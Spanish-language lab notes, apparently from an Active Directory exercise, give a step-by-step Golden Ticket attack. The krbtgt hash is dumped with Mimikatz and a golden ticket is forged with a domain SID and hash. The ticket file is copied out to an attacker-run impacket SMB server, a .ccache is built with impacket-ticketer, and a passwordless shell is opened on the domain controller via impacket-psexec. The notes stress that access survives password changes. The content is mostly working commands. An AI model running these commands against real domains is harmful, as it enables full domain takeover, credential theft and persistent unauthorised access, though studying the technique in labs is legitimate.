Entraremos al dominio y copiaremos la herramienta de Mimikatz para generar el tiket que utilizaremos 
Lo primero es dumpear la informacion del usurio  krbtgt para poder efectuar un pass the ticket
```
mimikatz#lsadump::lsa /inject /name:krbtgt

Esto nos dara la info del usurio que mas adelante utilizaremos para generar el ticket
```

Generando el ticket con los datos obtenidos de usuario
```
mimikatz # kerberos::golden /domain:s4vicorp.local /sid:S-1-5-21-2340386954-3318920936-2812726706 /rc4:0aea2d603a10970a16236466f76ec8e6 /user:Administrador /ticket:golden.kirbi

Genera un archivo golden.kirbi  que nos copiaremos en nuestra maquina atacante para poder acceder a todas la pc con este ticket


```

Luego nos lo copiamos al equipo 
```
Nos montamos un servidor de samba en nuestra maquina y nos copiamos el golden.kirbi desde la maquina de dominio

impacket-smbserver smbFolder $(pwd) -smb2support


copy golden.kirbi \\192.168.94.140\smbFolder\golden.kirbi

Si diera problemas tenemos que crearnos un servidor en samba con usuario y pass porque en algunos casos por politicas no los deja conectar si no tienen esto

Creamos el serv con user y pass
impacket-smbserver smbFolder $(pwd) -username test -password test123 -smb2support

# Luego en Windows:
Nos conectamos al recurso 
net use \\192.168.94.140\smbFolder /user:test test123

Desde la folder donde este el fichero lo enviamos 
copy golden.kirbi \\192.168.94.140\smbFolder\golden.kirbi


```

En nuestra maquina en la misma folder donde descargamos el fichero .kirbi creamos un fichero .ccache que se hace de la siguiente manera 
```
impacket-ticketer -nthash 62b6a85a8b95a180f3abbd002721983f -domain-sid S-1-5-21-3050386844-3522765933-1822280239 -domain savicorp.local Administrador

nthash  hash del usuario krbtgt
domain-sid  el sid del dominio en este caaso el del krbtgt
domainn el diminio que estamos testeando 
lo ultimo el Usuario que en este caso es al Administrador
Esto genera un  Administrador.ccache

Luego hacemos 
export KRB5CCNAME="/home/alex/AD_Exercise/Administrador.ccache"
con la ruta absoluta del fichero que creamos , recordar en la misma forder donde esra el .kirbi

Desde la folder donde tenemos el .kirbi y el ccache nos deja conectar sin necesidad de la pass aunque el usuario cambie el pass nos sigue sirviendo el ticket que nos generamos

Comando para conectar sin necesidad de pass
impacket-psexec -n -k savicorp.local/Administrador@DC-2019 cmd.exe

```